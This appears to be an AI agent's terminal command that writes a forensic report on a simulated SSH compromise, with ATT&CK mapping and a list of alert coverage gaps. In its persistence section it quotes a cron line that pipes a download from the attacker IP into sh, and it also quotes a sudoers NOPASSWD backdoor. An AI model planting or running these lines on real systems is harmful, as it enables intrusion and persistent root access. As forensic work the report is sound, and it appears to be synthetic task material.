Sending keys: ["cat << 'EOF' > /app/intrusion-report.md\n# Intrusion Forensic Investigation Report\n\n## Executive Summary\nOn 2026-08-15, host `ssh-prod-01` was compromised by an external threat actor. The actor gained initial access via SSH password brute-forcing against the `root` account originating from IP `198.51.100.78`. Post-compromise actions included deploying an XMRig cryptominer, establishing three separate persistence mechanisms (cron, systemd service, and shell initialization profile), planting a privilege escalation sudo backdoor, attempting internal lateral movement via SSH brute-forcing from a user account, and attempting defense evasion by clearing authentication logs. Evidence was correlated between the on-disk forensic image at `/disk` and security telemetry at `/sas`.\n\n## Identified Indicators & Entities (IOCs)\n- **Attacker Origin IP**: `198.51.100.78`. Evidence: `/disk/var/log/secure`, `/sas/cti/advisory.txt`.\n- **Command & Control (C2) Domain**: `update-ssh.example.cn`. Evidence: `/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`.\n- **Mining Pool Address**: `stratum+tcp://xmr.ssh.evil:3333`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`.\n- **Cryptocurrency Wallet**: `4A0000000000000000000d1ec67074f7`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`.\n- **Malicious Process & Binary**: Path: `/tmp/.X11-unix/.xorg`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).\n- **Malware SHA256 Hash**: `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253`. Evidence: `/disk/tmp/.X11-unix/.xorg`.\n- **Compromised & Backdoored Accounts**: \n  - `root` (initial compromise target). Evidence: `/disk/var/log/secure`.\n  - `devops` (granted NOPASSWD sudo access and used for internal pivoting). Evidence: `/disk/etc/sudoers.d/devops`, `/disk/home/devops/.bash_history`.\n\n## Complete Attack Chain & MITRE ATT&CK Mapping\n\n### 1. Initial Access — SSH Password Brute Force (`T1110` / `T1021.004`)\n- **Description**: The threat actor launched an automated hydra-style password brute-force attack against SSH (Port 22) for user `root`. Multiple failed attempts were logged between 00:53:24 and 00:54:52 UTC from `198.51.100.78` prior to a successful login at 00:54:55 UTC.\n- **Evidence**: `/disk/var/log/secure` (`Aug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from 198.51.100.78 port 51900 ssh2`), `/sas/cti/advisory.txt`.\n- **Alert Status**: NOT explicitly surfaced as a brute-force alert in `/sas/alerts.json` (discovered via log analysis on `/disk/var/log/secure`).\n\n### 2. Execution & Impact — Cryptomining Resource Hijacking (`T1059.004` / `T1496`)\n- **Description**: Upon acquiring root shell access, the attacker dropped an XMRig cryptomining binary at `/tmp/.X11-unix/.xorg` and launched a miner process (PID 1337) configured to connect to `stratum+tcp://xmr.ssh.evil:3333` with wallet `4A0000000000000000000d1ec67074f7`, causing sustained 100% CPU utilization.\n- **Evidence**: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).\n- **Alert Status**: Alerted (`ALERT-01` and `ALERT-02` in `/sas/alerts.json`).\n\n### 3. Persistence Mechanisms (`T1053.003`, `T1543.002`, `T1546.004`)\nThree distinct persistence mechanisms were installed on the host:\n1. **Cron Persistence (`T1053.003`)**: A root crontab entry was placed in `/var/spool/cron/root` scheduled to run every minute: `* * * * * root curl hxxp://198.51.100.78/x | sh` to re-download payloads.\n   - **Evidence**: `/disk/var/spool/cron/root`, `/sas/alerts.json` (`ALERT-05`).\n   - **Alert Status**: Alerted (`ALERT-05` in `/sas/alerts.json`).\n2. **Systemd Service Persistence (`T1543.002`)**: A custom systemd service file was installed at `/etc/systemd/system/system-update-helper.service` configured to automatically restart the miner / re-dropper binary upon system reboot or service failure.\n   - **Evidence**: `/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json` (`ALERT-06`).\n   - **Alert Status**: Alerted (`ALERT-06` in `/sas/alerts.json`).\n3. **Shell Initialization Persistence (`T1546.004`)**: The attacker modified `/root/.bashrc` to append a `PROMPT_COMMAND` execution line (`PROMPT_COMMAND beacon to 198.51.100.78`), ensuring code execution whenever an interactive root shell session is initiated.\n   - **Evidence**: `/disk/root/.bashrc`.\n   - **Alert Status**: SILENT — Missed by EDR telemetry in `/sas/alerts.json`.\n\n### 4. Privilege Escalation & Backdoor (`T1059.004` / `T1548.003`)\n- **Description**: The attacker planted a backdoor in the sudoers configuration at `/etc/sudoers.d/devops` granting `devops ALL=(ALL) NOPASSWD: ALL` to ensure persistent root access even if the root password were changed.\n- **Evidence**: `/disk/etc/sudoers.d/devops`.\n- **Alert Status**: SILENT — Missed by EDR telemetry in `/sas/alerts.json`.\n\n### 5. Internal Lateral Movement & Pivoting (`T1059.004` / `T1110`)\n- **Description**: Using the `devops` user foothold, the attacker executed internal SSH hydra brute-force scanning against other internal hosts on the local network.\n- **Evidence**: `/disk/home/devops/.bash_history` (`hydra-style SSH brute-force against sshd (wordlist, user=root)`).\n- **Alert Status**: SILENT — Missed by EDR telemetry in `/sas/alerts.json`.\n\n### 6. Defense Evasion — Log Tampering (`T1070.002`)\n- **Description**: The attacker attempted anti-forensics by truncating / clearing 15 lines from `/var/log/secure` at `2026-08-15 03:03:00 UTC` to conceal their initial access activities and commands.\n- **Evidence**: `/disk/var/log/secure` (`--- 15 authentication lines cleared here (T1070.002 log tampering) ---`).\n- **Alert Status**: SILENT — Missed by EDR telemetry in `/sas/alerts.json`.\n\n## Summary of Alert Coverage Gaps (Alerted vs. Silent)\n| Finding / Mechanism | Location | ATT&CK Technique | Telemetry Status |\n|---|---|---|---|\n| Miner Process | `/tmp/.X11-unix/.xorg` | T1496 | Alerted (`ALERT-01` in `/sas/alerts.json`) |\n| Miner Binary | `/tmp/.X11-unix/.xorg` | T1496 | Alerted (`ALERT-02` in `/sas/alerts.json`) |\n| Cron Persistence | `/var/spool/cron/root` | T1053.003 | Alerted (`ALERT-05` in `/sas/alerts.json`) |\n| Systemd Persistence | `/etc/systemd/system/system-update-helper.service` | T1543.002 | Alerted (`ALERT-06` in `/sas/alerts.json`) |\n| SSH Weak Baseline | `/etc/ssh/sshd_config` | T1110 | Alerted (`ALERT-03` in `/sas/alerts.json`) |\n| MySQL Remote Root | `/etc/my.cnf` | T1021 | Alerted (`ALERT-04` in `/sas/alerts.json`) |\n| Shell-Init Persistence | `/root/.bashrc` | T1546.004 | **SILENT** (Discovered on `/disk/root/.bashrc`) |\n| Sudo Backdoor | `/etc/sudoers.d/devops` | T1548.003 | **SILENT** (Discovered on `/disk/etc/sudoers.d/devops`) |\n| Internal Pivot Attempt | `/home/devops/.bash_history` | T1059.004 | **SILENT** (Discovered on `/disk/home/devops/.bash_history`) |\n| Log Clearing / Tampering | `/var/log/secure` | T1070.002 | **SILENT** (Discovered on `/disk/var/log/secure`) |\nEOF\n"] min_timeout_sec: 0.5 max_timeout_sec: 180.0
